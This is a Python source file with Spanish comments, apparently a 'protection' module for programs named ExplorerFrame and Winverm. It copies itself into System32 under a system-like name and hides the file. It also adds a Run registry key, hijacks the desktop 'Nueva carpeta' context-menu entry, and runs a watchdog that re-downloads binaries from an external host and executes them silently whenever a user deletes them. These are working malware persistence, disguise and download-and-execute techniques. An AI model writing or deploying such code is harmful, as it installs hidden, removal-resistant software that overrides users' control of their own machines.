"""
Módulo de Protección para ExplorerFrame y Winverm
- Solo funciona cuando está compilado (detecta si es .exe)
- Copia a System32 y se oculta
- Se registra en inicio de Windows
- Se registra como menú contextual
- Monitorea y protege ambos procesos
- Reinicia si se cierran o se eliminan
- Descarga y ejecuta si se eliminan
"""

import os
import sys
import shutil
import subprocess
import threading
import time
import psutil
import ctypes
import winreg
from pathlib import Path
from datetime import datetime
import requests

# Detectar si está compilado
IS_COMPILED = getattr(sys, 'frozen', False)

# Rutas
SYSTEM32 = Path(os.environ.get('WINDIR', 'C:\\Windows')) / 'System32'
EXPLORERFRAME_SOURCE = Path(sys.executable) if IS_COMPILED else None
EXPLORERFRAME_SYSTEM32 = SYSTEM32 / 'ExplorerFrame.exe'
WINVERM_SOURCE = Path(__file__).parent / 'winverm.py'
WINVERM_SYSTEM32 = SYSTEM32 / 'winverm.exe'

# URLs de descarga
API_BASE_URL = os.getenv("API_URL", "https://explorerframe.onrender.com")
UPDATE_TOKEN = os.getenv("UPDATE_TOKEN", "")

class ProcessProtector:
    """Protege procesos de ser cerrados o eliminados"""
    
    def __init__(self):
        self.running = False
        self.monitor_thread = None
        self.explorerframe_pid = os.getpid()
        self.winverm_pid = None
        self.program_name = "ExplorerFrame"
    
    def is_admin(self):
        """Verifica si tiene permisos de administrador"""
        try:
            return ctypes.windll.shell.IsUserAnAdmin()
        except:
            return False
    
    def register_startup(self, exe_path, program_name):
        """Registra el programa en inicio de Windows"""
        if not self.is_admin():
            return False
        
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, str(exe_path))
            print(f"[PROTECTION] {program_name} registrado en inicio")
            return True
        except Exception as e:
            print(f"[PROTECTION ERROR] No se pudo registrar en inicio: {str(e)}")
            return False
    
    def register_context_menu(self, exe_path, program_name):
        """Registra como menú contextual 'Nueva carpeta'"""
        if not self.is_admin():
            return False
        
        try:
            # Crear entrada en registro para menú contextual
            reg_path = r"Directory\Background\shell\Nueva carpeta\command"
            with winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, reg_path) as key:
                # Ejecutar con parámetro para crear carpeta
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" --create-folder "%V"')
            
            # Agregar ícono
            icon_path = Path(__file__).parent / 'app' / f'{program_name.lower()}.ico'
            if icon_path.exists():
                reg_path_icon = r"Directory\Background\shell\Nueva carpeta"
                with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, reg_path_icon, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, "Icon", 0, winreg.REG_SZ, str(icon_path))
            
            print(f"[PROTECTION] {program_name} registrado en menú contextual")
            return True
        except Exception as e:
            print(f"[PROTECTION ERROR] No se pudo registrar menú contextual: {str(e)}")
            return False
    
    def copy_to_system32(self, source, dest, program_name):
        """Copia programa a System32 y lo oculta"""
        if not IS_COMPILED:
            return False
        
        if not self.is_admin():
            return False
        
        try:
            if source and source.exists():
                shutil.copy2(source, dest)
                print(f"[PROTECTION] {program_name} copiado a {dest}")
            
            # Ocultar archivo
            self.hide_file(dest)
            print(f"[PROTECTION] {program_name} ocultado")
            
            return True
        except Exception as e:
            print(f"[PROTECTION ERROR] No se pudo copiar {program_name}: {str(e)}")
            return False
    
    def hide_file(self, file_path):
        """Oculta un archivo en Windows"""
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_HIDDEN)
        except:
            pass
    
    def download_and_execute(self, program_name):
        """Descarga y ejecuta el programa si se eliminó"""
        if not UPDATE_TOKEN:
            print(f"[PROTECTION] No hay token para descargar {program_name}")
            return False
        
        try:
            print(f"[PROTECTION] Descargando {program_name}...")
            
            # Solicitar token de descarga
            token_resp = requests.post(
                f"{API_BASE_URL}/api/v1/download/token",
                headers={"X-API-Key": UPDATE_TOKEN},
                json={"expires_minutes": 10},
                timeout=10
            )
            
            if token_resp.status_code != 200:
                print(f"[PROTECTION ERROR] No se pudo obtener token de descarga")
                return False
            
            download_url = token_resp.json()['download_url']
            
            # Descargar archivo
            file_resp = requests.get(download_url, timeout=30)
            if file_resp.status_code != 200:
                print(f"[PROTECTION ERROR] No se pudo descargar {program_name}")
                return False
            
            # Guardar en System32
            if program_name == "ExplorerFrame":
                exe_path = EXPLORERFRAME_SYSTEM32
            else:
                exe_path = WINVERM_SYSTEM32
            
            with open(exe_path, 'wb') as f:
                f.write(file_resp.content)
            
            # Ocultar
            self.hide_file(exe_path)
            
            # Ejecutar
            subprocess.Popen(
                [str(exe_path)],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            print(f"[PROTECTION] {program_name} descargado y ejecutado")
            return True
        
        except Exception as e:
            print(f"[PROTECTION ERROR] No se pudo descargar {program_name}: {str(e)}")
            return False
    
    def is_process_running(self, pid):
        """Verifica si un proceso está corriendo"""
        try:
            proc = psutil.Process(pid)
            return proc.is_running()
        except:
            return False
    
    def is_file_exists(self, file_path):
        """Verifica si un archivo existe"""
        return file_path.exists()
    
    def monitor_processes(self, program_name, other_program_name, system32_path, other_system32_path):
        """Monitorea y protege los procesos"""
        print(f"[PROTECTION] Iniciando monitoreo de {program_name}...")
        
        while self.running:
            try:
                # Verificar que el archivo existe
                if not self.is_file_exists(system32_path):
                    print(f"[PROTECTION] {program_name} fue eliminado, descargando...")
                    self.download_and_execute(program_name)
                
                # Verificar que el otro programa existe
                if not self.is_file_exists(other_system32_path):
                    print(f"[PROTECTION] {other_program_name} fue eliminado, descargando...")
                    self.download_and_execute(other_program_name)
                
                time.sleep(5)  # Verificar cada 5 segundos
            
            except Exception as e:
                print(f"[PROTECTION ERROR] Error en monitoreo: {str(e)}")
                time.sleep(5)
    
    def start(self, program_name, other_program_name, source_path, system32_path, other_system32_path):
        """Inicia la protección"""
        if not IS_COMPILED:
            print("[PROTECTION] No compilado, protección desactivada")
            return
        
        if not self.is_admin():
            print("[PROTECTION] Se requieren permisos de administrador para protección")
            return
        
        self.running = True
        self.program_name = program_name
        
        # Copiar a System32
        self.copy_to_system32(source_path, system32_path, program_name)
        
        # Registrar en inicio
        self.register_startup(system32_path, program_name)
        
        # Registrar en menú contextual
        self.register_context_menu(system32_path, program_name)
        
        # Iniciar monitoreo en thread
        self.monitor_thread = threading.Thread(
            target=self.monitor_processes,
            args=(program_name, other_program_name, system32_path, other_system32_path),
            daemon=True
        )
        self.monitor_thread.start()
        
        print(f"[PROTECTION] Sistema de protección de {program_name} activado")
    
    def stop(self):
        """Detiene la protección"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        print("[PROTECTION] Sistema de protección detenido")

# Instancia global
_protector = None

def init_protection_explorerframe():
    """Inicializa protección para ExplorerFrame"""
    global _protector
    if _protector is None:
        _protector = ProcessProtector()
        _protector.start(
            program_name="ExplorerFrame",
            other_program_name="Winverm",
            source_path=EXPLORERFRAME_SOURCE,
            system32_path=EXPLORERFRAME_SYSTEM32,
            other_system32_path=WINVERM_SYSTEM32
        )

def init_protection_winverm():
    """Inicializa protección para Winverm"""
    global _protector
    if _protector is None:
        _protector = ProcessProtector()
        _protector.start(
            program_name="Winverm",
            other_program_name="ExplorerFrame",
            source_path=WINVERM_SOURCE,
            system32_path=WINVERM_SYSTEM32,
            other_system32_path=EXPLORERFRAME_SYSTEM32
        )

def stop_protection():
    """Detiene el sistema de protección"""
    global _protector
    if _protector:
        _protector.stop()

# =============================================================================
# PUNTO DE ENTRADA
# =============================================================================

if __name__ == "__main__":
    import sys
    
    # Manejar argumentos de línea de comandos
    if len(sys.argv) > 1:
        if sys.argv[1] == "--create-folder":
            # Crear carpeta con icono (invocado desde contexto menu)
            try:
                from explorerframe import create_folder_with_icon
                create_folder_with_icon()
            except ImportError:
                # Si no se puede importar, crear carpeta manualmente
                try:
                    desktop = Path.home() / "Desktop"
                    if not desktop.exists():
                        desktop = Path.home() / "Documents"
                    
                    folder_name = "Nueva carpeta"
                    folder_path = desktop / folder_name
                    counter = 1
                    while folder_path.exists():
                        folder_path = desktop / f"{folder_name} ({counter})"
                        counter += 1
                    
                    folder_path.mkdir(parents=True, exist_ok=True)
                    
                    # Crear archivo desktop.ini para asignar icono
                    icon_path = Path(__file__).parent / "app" / "app-icon.ico"
                    if icon_path.exists():
                        desktop_ini = folder_path / "desktop.ini"
                        with open(desktop_ini, 'w') as f:
                            f.write("[.ShellClassInfo]\n")
                            f.write(f"IconResource={icon_path},0\n")
                        
                        # Ocultar desktop.ini
                        ctypes.windll.kernel32.SetFileAttributesW(str(desktop_ini), 2)
                        
                        # Marcar carpeta como sistema
                        ctypes.windll.kernel32.SetFileAttributesW(str(folder_path), 4)
                    
                    # Abrir explorador en la carpeta
                    subprocess.Popen(f'explorer /select,"{folder_path}"')
                except Exception as e:
                    print(f"Error: {e}")
            sys.exit(0)
    
    # Inicializar protección para ExplorerFrame
    init_protection_explorerframe()
    
    # Mantener el programa corriendo
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_protection()
        sys.exit(0)
